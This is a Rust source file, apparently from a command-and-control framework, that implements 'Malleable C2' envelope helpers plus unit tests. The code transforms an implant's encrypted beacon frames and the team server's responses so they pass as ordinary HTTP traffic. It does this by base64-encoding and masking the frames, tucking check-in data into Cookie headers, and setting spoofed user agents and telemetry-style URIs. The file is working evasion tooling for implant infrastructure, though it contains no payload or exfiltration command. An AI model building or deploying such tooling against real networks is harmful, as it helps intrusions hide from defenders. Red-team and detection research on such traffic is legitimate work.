//! Malleable C2 HTTP *envelope* helpers.
//!
//! The transform engine ([`crate::transform`]) applies byte transforms to a
//! payload, but a profile's `server { output { ... } }` block also declares
//! *where* the transformed bytes go (header / parameter / body / uri-append)
//! and which response headers to set. This module turns a parsed profile into
//! ready-to-use request/response shaping so the team server can stop emitting
//! raw encrypted frames and instead make beacon traffic look like the
//! transaction the profile describes.
//!
//! Two directions, symmetric across the wire:
//! - [`ServerEnvelope`] (via [`post_server_envelope`]/[`get_server_envelope`])
//!   shapes the server→beacon *response*; the team server applies it in
//!   `shape_beacon_response`.
//! - [`ClientEnvelope`] (via [`post_client_envelope`]/[`get_client_envelope`])
//!   shapes the beacon→server *request*; the implant applies the transform to
//!   its encrypted frame before sending and the team server inverts it in
//!   `handle_beacon` before `parse_frame`. The transform engine is invertible
//!   ([`transform::decode`] undoes [`transform::encode`]), so a profile that
//!   declares `client { output { base64; print; } }` makes the beacon body
//!   base64 on the wire while the server still parses the raw frame.

use crate::ast::{Block, Profile};
use crate::transform::{self, Terminator};

/// A fully-resolved description of how to shape the server→beacon response for
/// one transaction (`http-get` or `http-post`). Derived from the profile's
/// `server { output { ... } }` + `header` statements.
#[derive(Debug, Clone, Default)]
pub struct ServerEnvelope {
    /// Transform steps to apply to the encrypted frame body (in source order).
    pub steps: Vec<transform::Step>,
    /// Where the transformed body goes. `None` means "no output block; body is
    /// raw" (the legacy behaviour before profile envelopes were wired up).
    pub terminator: Option<Terminator>,
    /// `(name, value)` pairs from `header "N" "V";` statements in the server
    /// block, to set on the HTTP response.
    pub headers: Vec<(Vec<u8>, Vec<u8>)>,
}

impl ServerEnvelope {
    /// Shape an encrypted frame body for the wire: apply the transform pipeline
    /// and, if the terminator is a header/parameter, return `(body, extra)`
    /// where `extra` is the bytes to inject there. For `print`/`uri-append`
    /// the bytes ride in the body itself, so `extra` is empty.
    pub fn shape_body(&self, frame: &[u8]) -> (Vec<u8>, Vec<u8>) {
        let transformed = transform::encode(&self.steps, frame);
        match &self.terminator {
            Some(Terminator::Header(_)) | Some(Terminator::Parameter(_)) => {
                (Vec::new(), transformed)
            }
            Some(Terminator::Print) | Some(Terminator::UriAppend) | None => {
                (transformed, Vec::new())
            }
        }
    }
}

/// Resolve the server-side envelope for the profile's `http-post` transaction
/// (the beacon's main task-delivery channel). Returns a default (no-op) envelope
/// when the profile has no `server { output { } }` block, so callers can always
/// apply it without a None-check.
pub fn post_server_envelope(profile: &Profile) -> ServerEnvelope {
    transaction_server_envelope(profile.http_post())
}

/// Resolve the server-side envelope for `http-get`.
pub fn get_server_envelope(profile: &Profile) -> ServerEnvelope {
    transaction_server_envelope(profile.http_get())
}

fn transaction_server_envelope(txn: Option<&Block>) -> ServerEnvelope {
    let Some(txn) = txn else {
        return ServerEnvelope::default();
    };
    let server = match txn.sub("server") {
        Some(s) => s,
        None => return ServerEnvelope::default(),
    };
    let mut env = ServerEnvelope::default();
    // The `output` data block carries the body transform chain + terminator.
    if let Some(output) = server.sub("output") {
        env.steps = transform::steps_from_block(output);
        env.terminator = terminator_of(output);
    }
    // `header "N" "V";` statements (both inside and outside data blocks in CS).
    for args in server.stmts("header") {
        if args.len() >= 2 {
            env.headers.push((args[0].0.clone(), args[1].0.clone()));
        }
    }
    env
}

// ---- client-side request envelope (beacon → server) ------------------------

/// A fully-resolved description of how to shape the beacon→server *request* for
/// one transaction (`http-get` or `http-post`). Symmetric to [`ServerEnvelope`]
/// but for the request direction: the implant applies [`ClientEnvelope::shape_body`]
/// to its encrypted frame before sending, and the team server inverts it in the
/// beacon handler before `parse_frame`.
///
/// Derived from the profile's `client { output/metadata { ... } }` data block +
/// the client-block `header "N" "V";` statements + the top-level `set useragent`.
#[derive(Debug, Clone, Default)]
pub struct ClientEnvelope {
    /// Transform steps to apply to the encrypted frame body (in source order).
    pub steps: Vec<transform::Step>,
    /// Where the transformed body goes. `None` = no data block; body is raw.
    pub terminator: Option<Terminator>,
    /// `(name, value)` pairs from `header "N" "V";` statements directly in the
    /// client block (static headers added to every request).
    pub headers: Vec<(Vec<u8>, Vec<u8>)>,
    /// `set useragent` (top-level option). `None` = use the transport default.
    pub useragent: Option<Vec<u8>>,
}

impl ClientEnvelope {
    /// Shape an encrypted frame body for the request — the mirror of
    /// [`ServerEnvelope::shape_body`]. Returns `(body, extra)` where `extra`
    /// holds the bytes to inject into a header/parameter terminator (empty for
    /// `print`/`uri-append`/none, where the bytes ride in the body).
    pub fn shape_body(&self, frame: &[u8]) -> (Vec<u8>, Vec<u8>) {
        let transformed = transform::encode(&self.steps, frame);
        match &self.terminator {
            Some(Terminator::Header(_)) | Some(Terminator::Parameter(_)) => {
                (Vec::new(), transformed)
            }
            Some(Terminator::Print) | Some(Terminator::UriAppend) | None => {
                (transformed, Vec::new())
            }
        }
    }

    /// Whether this envelope is a no-op (no steps, no terminator, no headers,
    /// no useragent) — i.e. the implant should send the raw frame untouched and
    /// the server should skip its decode pass. The common dev case (no profile,
    /// or a profile with no `client { }` block).
    pub fn is_noop(&self) -> bool {
        self.steps.is_empty()
            && self.terminator.is_none()
            && self.headers.is_empty()
            && self.useragent.is_none()
    }
}

/// Resolve the client-side request envelope for `http-post` (the beacon's
/// outbound tasking channel). Reads the `client { output { ... } }` data block,
/// the client-block static headers, and the top-level `set useragent`.
pub fn post_client_envelope(profile: &Profile) -> ClientEnvelope {
    transaction_client_envelope(profile, profile.http_post(), "output")
}

/// Resolve the client-side request envelope for `http-get` (the beacon's
/// check-in/metadata channel). Reads the `client { metadata { ... } }` block.
pub fn get_client_envelope(profile: &Profile) -> ClientEnvelope {
    transaction_client_envelope(profile, profile.http_get(), "metadata")
}

fn transaction_client_envelope(
    profile: &Profile,
    txn: Option<&Block>,
    data_block: &str,
) -> ClientEnvelope {
    let mut env = ClientEnvelope {
        // `set useragent` is a top-level option, not per-transaction.
        useragent: profile.option("useragent").map(|s| s.0.clone()),
        ..ClientEnvelope::default()
    };
    let Some(txn) = txn else {
        return env;
    };
    let Some(client) = txn.sub("client") else {
        return env;
    };
    // The data block (`output` for http-post, `metadata` for http-get) carries
    // the body transform chain + terminator.
    if let Some(data) = client.sub(data_block) {
        env.steps = transform::steps_from_block(data);
        env.terminator = terminator_of(data);
    }
    // Static `header "N" "V";` statements directly in the client block. A
    // 1-arg `header "Cookie";` *inside* the data block is the terminator (above),
    // not a static header — it is a child of the data block, not of `client`.
    for args in client.stmts("header") {
        if args.len() >= 2 {
            env.headers.push((args[0].0.clone(), args[1].0.clone()));
        }
    }
    env
}

/// The terminator of a data block = the last non-transform statement that
/// declares where bytes go (`header`, `parameter`, `print`, `uri-append`).
fn terminator_of(block: &Block) -> Option<Terminator> {
    for item in &block.items {
        if let crate::ast::Item::Stmt { keyword, args, .. } = item {
            match keyword.as_str() {
                "header" => {
                    return Some(Terminator::Header(
                        String::from_utf8_lossy(&args.first()?.0).into_owned(),
                    ));
                }
                "parameter" => {
                    return Some(Terminator::Parameter(
                        String::from_utf8_lossy(&args.first()?.0).into_owned(),
                    ));
                }
                "print" => return Some(Terminator::Print),
                "uri-append" => return Some(Terminator::UriAppend),
                _ => {}
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(src: &str) -> Profile {
        crate::parse(src).expect("profile must parse")
    }

    #[test]
    fn empty_profile_is_noop_envelope() {
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        );
        let env = post_server_envelope(&p);
        assert_eq!(env.steps, vec![]);
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert!(env.headers.is_empty());
    }

    #[test]
    fn output_transform_chain_is_extracted() {
        let p = parse(
            r#"http-post {
                set uri "/api/telemetry";
                client { output { base64; } }
                server {
                    output {
                        base64;
                        mask;
                        prepend "\x1f\x8b";
                        print;
                    }
                    header "Content-Type" "application/json";
                    header "X-Trace" "abc";
                }
            }"#,
        );
        let env = post_server_envelope(&p);
        assert_eq!(
            env.steps,
            vec![
                transform::Step::Base64,
                transform::Step::Mask,
                transform::Step::Prepend(vec![0x1f, 0x8b]),
            ]
        );
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert_eq!(env.headers.len(), 2);
        assert_eq!(env.headers[0].0, b"Content-Type");
        assert_eq!(env.headers[0].1, b"application/json");
    }

    #[test]
    fn shaping_then_unshaping_roundtrips() {
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { base64; prepend "PRE"; append "POST"; print; } } }"#,
        );
        let env = post_server_envelope(&p);
        let frame = b"encrypted-frame-bytes-here";
        let (body, extra) = env.shape_body(frame);
        assert!(extra.is_empty(), "print terminator keeps bytes in body");
        assert!(body.starts_with(b"PRE"));
        assert!(body.ends_with(b"POST"));
        // The transform pipeline is invertible: decode(body) == frame.
        let restored = transform::decode(&env.steps, &body).unwrap();
        assert_eq!(restored, frame);
    }

    #[test]
    fn header_terminator_puts_bytes_in_extra() {
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { base64; header "Cookie"; } } }"#,
        );
        let env = post_server_envelope(&p);
        let (body, extra) = env.shape_body(b"hello");
        assert!(
            body.is_empty(),
            "body should be empty for header terminator"
        );
        assert!(!extra.is_empty(), "transformed bytes go in extra");
    }

    // ---- ClientEnvelope (beacon → server request shaping) ------------------

    #[test]
    fn profile_with_no_client_block_is_noop() {
        // No `client { }` block → the implant must send the raw frame and the
        // server must skip its decode pass. This is the default dev path.
        let p = parse(r#"http-post { set uri "/p"; server { output { print; } } }"#);
        let env = post_client_envelope(&p);
        assert!(env.is_noop(), "no client block → raw frame, no shaping");
        assert!(env.useragent.is_none());
    }

    #[test]
    fn client_output_print_terminator_is_not_noop() {
        // A `client { output { print; } }` has no transform steps but DOES set
        // a terminator, so it is NOT a no-op (the bytes still ride in the body
        // via print, but the envelope is "declared").
        let p = parse(
            r#"http-post { set uri "/p"; client { output { print; } } server { output { print; } } }"#,
        );
        let env = post_client_envelope(&p);
        assert_eq!(env.steps, vec![]);
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert!(!env.is_noop(), "terminator present → not a no-op");
    }

    #[test]
    fn client_output_transform_useragent_and_static_headers_extracted() {
        let p = parse(
            r#"
            set useragent "Mozilla/5.0 (X11; Linux x86_64) Chrome/120";
            http-post {
                set uri "/api/telemetry";
                client {
                    header "Accept" "application/json";
                    header "X-Client" "nyx";
                    output {
                        base64;
                        prepend "data=";
                        append "&end=1";
                        print;
                    }
                }
                server { output { print; } }
            }"#,
        );
        let env = post_client_envelope(&p);
        assert_eq!(
            env.steps,
            vec![
                transform::Step::Base64,
                transform::Step::Prepend(b"data=".to_vec()),
                transform::Step::Append(b"&end=1".to_vec()),
            ]
        );
        assert_eq!(env.terminator, Some(Terminator::Print));
        assert_eq!(
            env.useragent.as_deref(),
            Some(&b"Mozilla/5.0 (X11; Linux x86_64) Chrome/120"[..])
        );
        assert_eq!(env.headers.len(), 2);
        assert_eq!(
            env.headers[0],
            (b"Accept".to_vec(), b"application/json".to_vec())
        );
        assert_eq!(env.headers[1], (b"X-Client".to_vec(), b"nyx".to_vec()));
    }

    #[test]
    fn client_shape_then_decode_roundtrips_frame() {
        // THE contract: whatever bytes the implant puts on the wire, the server
        // must invert back to the raw frame before parse_frame. encode on the
        // implant (shape_body), decode on the server → original frame bytes.
        let p = parse(
            r#"http-post {
                set uri "/p";
                client { output { mask; base64; prepend "PRE"; append "POST"; print; } }
                server { output { print; } }
            }"#,
        );
        let env = post_client_envelope(&p);
        let frame = b"[32B pubkey][8B counter][4B ct_len][ciphertext||16B tag]";
        let (body, extra) = env.shape_body(frame);
        assert!(extra.is_empty(), "print terminator keeps bytes in body");
        // The server uses the SAME step list to invert.
        let restored = transform::decode(&env.steps, &body).expect("decode must invert encode");
        assert_eq!(restored.as_slice(), frame);
    }

    #[test]
    fn client_get_metadata_header_terminator_uses_extra() {
        // http-get check-in: `metadata { base64; header "Cookie"; }` → the
        // transformed bytes ride in the Cookie header, body empty.
        let p = parse(
            r#"http-get {
                set uri "/c";
                client { metadata { base64; header "Cookie"; } }
                server { output { print; } }
            }"#,
        );
        let env = get_client_envelope(&p);
        assert_eq!(env.steps, vec![transform::Step::Base64]);
        assert!(matches!(env.terminator, Some(Terminator::Header(ref h)) if h == "Cookie"));
        let (body, extra) = env.shape_body(b"checkin-frame");
        assert!(body.is_empty(), "header terminator → body empty");
        assert!(
            !extra.is_empty(),
            "transformed bytes go in extra (the header value)"
        );
        // Server reads the header value and base64-decodes it back to the frame.
        let restored = transform::decode(&env.steps, &extra).unwrap();
        assert_eq!(restored, b"checkin-frame");
    }
}
